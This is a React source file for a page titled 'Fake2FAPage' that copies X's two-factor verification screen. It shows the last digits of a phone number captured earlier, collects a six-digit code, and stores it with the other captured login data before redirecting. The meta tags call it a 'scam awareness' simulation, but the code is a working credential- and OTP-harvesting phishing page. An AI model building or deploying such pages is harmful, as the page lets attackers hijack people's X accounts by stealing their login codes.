import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { Helmet } from 'react-helmet';
import { useAppState } from '@/context/AppStateContext';
import { X_LOGO_URL } from '@/config/constants';

export default function Fake2FAPage() {
  const [code, setCode] = useState('');
  const [phoneLastDigits, setPhoneLastDigits] = useState('94'); // Default fallback
  const navigate = useNavigate();
  const { addCapturedData, showToast } = useAppState();

  useEffect(() => {
    // Get the phone number from localStorage and extract last 2 digits
    const currentCaptureString = localStorage.getItem('currentCapture');
    if (currentCaptureString) {
      try {
        const currentCapture = JSON.parse(currentCaptureString);
        if (currentCapture.phoneNumber) {
          // Extract only digits from phone number and get last 2
          const phoneNumber = currentCapture.phoneNumber.toString();
          const digitsOnly = phoneNumber.replace(/\D/g, ''); // Remove all non-digits
          const lastTwoDigits = digitsOnly.slice(-2);
          if (lastTwoDigits.length >= 2) {
            setPhoneLastDigits(lastTwoDigits);
          }
        }
      } catch (error) {
        console.error("Error parsing currentCapture from localStorage:", error);
        // Keep default "94" if there's an error
      }
    }
  }, []);

  const handleCodeChange = (e) => {
    const value = e.target.value;
    if (/^\d*$/.test(value) && value.length <= 6) {
      setCode(value);
    }
  };

  const handleSubmitCode = () => {
    if (code.length === 6) {
      const currentCaptureString = localStorage.getItem('currentCapture');
      if (currentCaptureString) {
        try {
          const currentCapture = JSON.parse(currentCaptureString);
          addCapturedData({ ...currentCapture, code });
          localStorage.removeItem('currentCapture');
        } catch (error) {
          console.error("Error parsing currentCapture from localStorage:", error);
          showToast({
            title: "Error",
            description: "Could not process your request. Please try again.",
            variant: "destructive",
          });
          return;
        }
      } else {
        showToast({
            title: "Error",
            description: "Session data not found. Please start over.",
            variant: "destructive",
        });
        navigate('/login-verification');
        return;
      }
      navigate('/system-dashboard');
    } else {
       showToast({
        title: "Invalid Code",
        description: "Please enter a valid 6-digit code.",
        variant: "destructive",
      });
    }
  };

  return (
    <>
      <Helmet>
        <title>X 2FA Verification - Scam Awareness</title>
        <meta name="description" content="Simulated X 2FA page for scam awareness education." />
      </Helmet>
      <div className="bg-[#1e1e2f] font-chirp text-white flex justify-center items-center min-h-screen p-4">
        <div className="bg-[#15202b] p-[30px] rounded-[10px] w-full max-w-[420px] text-center shadow-[0_0_15px_rgba(0,0,0,0.5)]">
          <img src={X_LOGO_URL} alt="X Logo" className="w-12 h-12 mx-auto mb-6" />
          <h2 className="text-[#1da1f2] text-2xl mb-[15px]">X 2FA Verification</h2>
          <p className="text-[0.95em] mb-5 text-white">
            We've sent a 6-digit code to your phone ending in <strong className="font-bold">{phoneLastDigits}</strong>.<br /><br />
            Please enter the code below to complete your verification.
          </p>
          <input
            type="text"
            placeholder="Enter 6-digit code"
            value={code}
            onChange={handleCodeChange}
            className="w-full p-3 mb-[15px] bg-[#253341] border-none rounded-[6px] text-white text-[0.95em] box-border text-center"
            maxLength="6"
            pattern="\d{6}"
            inputMode="numeric"
          />
          <button
            onClick={handleSubmitCode}
            className="w-full p-3 bg-[#1da1f2] text-white border-none rounded-[6px] text-[1em] cursor-pointer hover:bg-[#1a91da] transition-colors"
          >
            Verify Code
          </button>
        </div>
      </div>
    </>
  );
}
